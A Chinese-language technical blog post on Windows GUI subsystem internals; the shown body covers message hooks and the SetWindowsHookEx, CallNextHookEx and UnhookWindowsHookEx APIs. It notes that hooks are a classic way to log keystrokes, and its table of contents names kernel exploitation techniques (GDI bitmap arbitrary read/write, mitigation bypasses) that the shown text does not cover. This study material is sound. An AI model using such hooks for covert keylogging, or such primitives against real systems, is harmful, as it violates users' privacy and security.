<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon1.ico">
  <link rel="mask-icon" href="/images/favicon.ico" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"directoree.github.io","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
  </script>

  <meta name="description" content="😄">
<meta property="og:type" content="article">
<meta property="og:title" content="GUI Subsystem 用户回调">
<meta property="og:url" content="https://directoree.github.io/post/Windows-GUI-Subsystem2/index.html">
<meta property="og:site_name" content="Catecat">
<meta property="og:description" content="😄">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/10/12/4vUDqb9rZhN7E1c.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/13/vxgZjEQTqakSVMe.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/13/FL2PBhNEVqMg5KC.png">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiEnableKvaShadowing.jpg">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiSystemCall64Shadow.png">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiBreakpointTrapShadow.jpg">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/SwapContext.jpg">
<meta property="og:image" content="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiKernelSysretExit">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/qlS4ixbLKZfuv1o.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/rKCBDAQFqglvf9j.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/CzKN4hkqQXYuDtM.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/QjIRO51cnSL62Ai.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/ys8UjmzEFNYCoSv.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/NK7PhSsmqVbt12j.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/93luQyKFrRcxiz1.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/6McwEly7xYA9N4a.png">
<meta property="og:image" content="https://s2.loli.net/2022/10/18/5hH8vwjNOB9Vc63.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100213.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100217.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100219.png">
<meta property="og:image" content="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100224.png">
<meta property="article:published_time" content="2022-10-12T10:11:02.000Z">
<meta property="article:modified_time" content="2022-10-23T15:58:38.093Z">
<meta property="article:author" content="Catecat">
<meta property="article:tag" content="Windows内核">
<meta property="article:tag" content="GUI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/10/12/4vUDqb9rZhN7E1c.png">


<link rel="canonical" href="https://directoree.github.io/post/Windows-GUI-Subsystem2/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>GUI Subsystem 用户回调 | Catecat</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?b832a9ae9a43377003fd975ca4e525ea";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Catecat</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">爱你所爱，行你所行，听从你心，无问西东。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/newcategories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-更新日志">

    <a href="/changelog" rel="section"><i class="fa fa-heartbeat fa-fw"></i>更新日志</a>

  </li>
        <li class="menu-item menu-item-空调房">

    <a href="/tips" rel="section"><i class="fa fa-wifi fa-fw"></i>空调房</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E9%92%A9%E5%AD%90%EF%BC%88Hook%EF%BC%89"><span class="nav-text">1 钩子（Hook）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%B6%88%E6%81%AF%E9%92%A9%E5%AD%90"><span class="nav-text">1.1 消息钩子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0"><span class="nav-text">钩子函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E7%9A%84%E5%AE%89%E8%A3%85%E3%80%81%E4%BC%A0%E9%80%92%E3%80%81%E5%8D%B8%E8%BD%BD"><span class="nav-text">钩子的安装、传递、卸载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%92%A9%E5%AD%90%E9%93%BE%E8%A1%A8"><span class="nav-text">钩子链表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B6%88%E6%81%AF%E9%92%A9%E5%AD%90%E7%BB%93%E6%9E%84tagHOOK"><span class="nav-text">消息钩子结构tagHOOK</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E6%89%80%E6%9C%89%E6%B6%88%E6%81%AF%E6%8C%82%E9%92%A9"><span class="nav-text">枚举所有消息挂钩</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E4%BA%8B%E4%BB%B6%E9%92%A9%E5%AD%90"><span class="nav-text">1.2 事件钩子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-GUI-Windows-10%E4%BB%A5%E5%90%8E%E7%9A%84%E5%8F%98%E5%8C%96"><span class="nav-text">2 GUI-Windows 10以后的变化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%88%9D%E6%AD%A5%E4%BA%86%E8%A7%A3KVAS"><span class="nav-text">3 初步了解KVAS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFKVAS"><span class="nav-text">什么是KVAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90KVAS%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">分析KVAS初始化过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dual-CR3"><span class="nav-text">dual CR3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-User-Mode-CallBack"><span class="nav-text">4 User-Mode CallBack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%8F%82%E6%95%B0%E8%A7%A3%E9%87%8A"><span class="nav-text">4.1 参数解释</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ApiNumber"><span class="nav-text">ApiNumber</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#InputBuffer"><span class="nav-text">InputBuffer</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-KeUserModeCallback-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">4.2 KeUserModeCallback 函数分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#KSTACK-CONTROL"><span class="nav-text">KSTACK_CONTROL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#KeUserModeCallback%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">KeUserModeCallback源码分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-KiCallUserMode%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">4.3 KiCallUserMode函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-KiServiceExit"><span class="nav-text">4.4 KiServiceExit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-KiUserCallbackDispatcher%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">4.5 KiUserCallbackDispatcher函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-6-ZwCallbackReturn"><span class="nav-text">4.6 ZwCallbackReturn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-7-NtCallbackReturn"><span class="nav-text">4.7 NtCallbackReturn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-8-%E8%B0%83%E7%94%A8%E5%85%A8%E6%99%AF%E5%9B%BE"><span class="nav-text">4.8 调用全景图</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%90%8E%E7%BB%AD%E5%B7%A5%E4%BD%9C"><span class="nav-text">5 后续工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-GDI-%E5%AF%B9%E8%B1%A1%E5%88%86%E6%9E%90"><span class="nav-text">6 GDI 对象分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Bitmap%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-text">1.1 Bitmap基础概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Bitmap-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%EF%BC%88-lt-1607%EF%BC%89"><span class="nav-text">1.2 Bitmap 任意地址读写（&lt;1607）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E7%BB%95%E8%BF%87-RS1-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%EF%BC%88-lt-1703%EF%BC%89"><span class="nav-text">1.3 绕过 RS1 缓解措施（&lt;1703）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E7%BB%95%E8%BF%87-RS2-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%EF%BC%88-lt-1709%EF%BC%89"><span class="nav-text">1.4 绕过 RS2 缓解措施（&lt;1709）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Palette%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-text">2.1 Palette基础概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-CreatePalette"><span class="nav-text">2.2 CreatePalette</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-GetPaletteEntries-x2F-SetPaletteEntries"><span class="nav-text">2.3 GetPaletteEntries&#x2F;SetPaletteEntries</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">2.4 利用思路</span></a></li></ol></li></ol></div>
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Catecat"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Catecat</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">139</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/newcategories/">
          
        <span class="site-state-item-count">62</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">73</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Directoree" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Directoree" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:zhao_yilong@aliyun.com" title="E-Mail → mailto:zhao_yilong@aliyun.com" rel="noopener" target="_blank"><i class="fas fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="http://sighttp.qq.com/msgrd?v=1&uin=1003432683" title="QQ → http:&#x2F;&#x2F;sighttp.qq.com&#x2F;msgrd?v&#x3D;1&amp;uin&#x3D;1003432683" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
      </span>
  </div>
  <div class="cc-license site-overview-item animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://treecatee.github.io/" title="https:&#x2F;&#x2F;treecatee.github.io" rel="noopener" target="_blank">Treecatee</a>
        </li>
    </ul>
  </div>

      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/Windows-GUI-Subsystem2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Catecat">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Catecat">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          GUI Subsystem 用户回调
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-10-12 18:11:02" itemprop="dateCreated datePublished" datetime="2022-10-12T18:11:02+08:00">2022-10-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-10-23 23:58:38" itemprop="dateModified" datetime="2022-10-23T23:58:38+08:00">2022-10-23</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/GUI/" itemprop="url" rel="index"><span itemprop="name">GUI</span></a>
        </span>
    </span>

  
    <span id="/post/Windows-GUI-Subsystem2/" class="post-meta-item leancloud_visitors" data-flag-title="GUI Subsystem 用户回调" title="阅读次数">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span class="leancloud-visitors-count"></span>
    </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/post/Windows-GUI-Subsystem2/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/post/Windows-GUI-Subsystem2/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>65k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>59 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>😄</p>
<span id="more"></span>

<h2 id="1-钩子（Hook）"><a href="#1-钩子（Hook）" class="headerlink" title="1 钩子（Hook）"></a>1 钩子（Hook）</h2><h3 id="1-1-消息钩子"><a href="#1-1-消息钩子" class="headerlink" title="1.1 消息钩子"></a>1.1 消息钩子</h3><p><strong>消息钩子可以在窗口消息到达目标窗口过程之前拦截它们</strong>。消息钩子可以在窗口消息到达目标窗口过程之前拦截它们。 例如，攻击者可以监视所有与键盘相关的消息，包括 <code>WM_KEYDOMN</code>，以便记录它们，然后将它们传递给预期的应用程序，或者阻止它们到达正确的位置。 这是在基于 Windows 的系统上记录击键的最古老和最有效的方法之一。</p>
<p>当钩子函数钩到预期的消息后，可以决定是否将消息继续往后传递（传给下一个钩子函数或传给目标窗口回调函数）。</p>
<p>消息传递，无钩子情况：</p>
<p><img data-src="https://s2.loli.net/2022/10/12/4vUDqb9rZhN7E1c.png" alt="28.png"></p>
<p>有全局钩子的情况：</p>
<p><img data-src="https://s2.loli.net/2022/10/13/vxgZjEQTqakSVMe.png" alt="29.png"></p>
<ul>
<li><strong>局部钩子</strong>：仅监控<strong>当前进程中</strong>指定线程的消息。</li>
<li><strong>全局钩子</strong>：监控当前桌面中所有处理消息的线程（Affect all GUI threads in the same desktop）。<strong>全局钩子函数必须放在DLL中</strong>，然后将 DLL 注入目标进程。</li>
</ul>
<h4 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h4><p>钩子处理回调函数，参数由系统提供，可参阅<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644975(v=vs.85)">CallWndProc</a>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">HookProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ <span class="keyword">int</span> nCode, </span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ WPARAM wParam, </span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// process message</span></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> CallNextHookEx(<span class="literal">NULL</span>, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><em>nCode</em>：指定钩子过程是否必须处理消息。如果<em>nCode</em>是<strong>HC_ACTION</strong>，钩子过程必须处理消息。如果<em>nCode</em>小于零，钩子过程必须将消息传递给<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644974(v=vs.85)"><strong>CallNextHookEx</strong></a>函数，而无需进一步处理，并且必须返回<strong>CallNextHookEx</strong>返回的值。</li>
<li><em>wParam</em> 和 <em>lParam</em> ：值依赖于钩子码，但是它们一般包含着与发送或投递的消息相关的信息。</li>
</ul>
<p><strong>返回值</strong>：</p>
<p>如果<em>nCode</em>小于零，钩子过程必须返回<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644974(v=vs.85)"><strong>CallNextHookEx</strong></a>返回的值。</p>
<p>如果<em>nCode</em>大于或等于零，强烈建议您调用<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644974(v=vs.85)"><strong>CallNextHookEx</strong></a>并返回其返回的值；否则，安装了<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/ms644959(v=vs.85)"><strong>WH_CALLWNDPROC</strong></a>钩子的其他应用程序将不会收到钩子通知，因此行为不正确。如果钩子过程不调用<strong>CallNextHookEx</strong>，则返回值应为零。</p>
<ol>
<li><code>return CallNextHookEx</code>，表示将消息继续往下传递。</li>
<li><code>return 0</code>，表示对当前消息已经处理了，并且屏蔽了，消息就不会传递了。目标窗口也不会再收到该消息。</li>
</ol>
<h4 id="钩子的安装、传递、卸载"><a href="#钩子的安装、传递、卸载" class="headerlink" title="钩子的安装、传递、卸载"></a>钩子的安装、传递、卸载</h4><p>钩子的安装函数是 <code>SetWindowsHookEx</code>。在钩子的处理回调函数中，如果对钩到的消息处理后，还要继续往后传递该消息，可以调用 <code>CallNextHookEx</code> 函数。钩子的卸载函数是 <code>UnhookWindowsHookEx</code>。</p>
<p><strong>安装钩子函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">int</span>       idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HOOKPROC  lpfn,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HINSTANCE hmod,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD     dwThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>idHook</td>
<td>钩子类型，即要钩取什么类型的消息，以 <code>WH_</code> 下标开始。目前有 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">15 种</a>。</td>
</tr>
<tr>
<td>lpfn</td>
<td>钩子函数的地址。局部钩子：当前进程中定义的钩子函数地址。全局钩子：DLL 中导出的钩子函数地址。</td>
</tr>
<tr>
<td></td>
<td>钩子函数所在模块的基地址。局部钩子：如果钩子函数在当前进程中进行定义的，该值为 <code>NULL</code>。全局钩子：该值为 DLL 的加载基址，此 DLL 加载到拥有目标窗口的线程的地址空间中。</td>
</tr>
<tr>
<td>dwThreadId</td>
<td>钩子线程 TID。局部钩子：<code>GetCurrentThreadId()</code>。全局钩子：<code>0</code>。</td>
</tr>
</tbody></table>
<p><strong>传递钩子函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional] HHOOK  hhk,	<span class="comment">//钩子的句柄，由SetWindowsHookEx()函数返回。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           <span class="keyword">int</span>    nCode,	<span class="comment">//钩子函数的nCode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           WPARAM wParam,	<span class="comment">//钩子函数的wParam</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in]           LPARAM lParam	<span class="comment">//钩子函数的lParam</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p><strong>卸载钩子函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HHOOK hhk	<span class="comment">//钩子的句柄，由SetWindowsHookEx()函数返回。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>全局钩子代码示例：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/157994861">Windows窗口与消息：钩子</a>。</p>
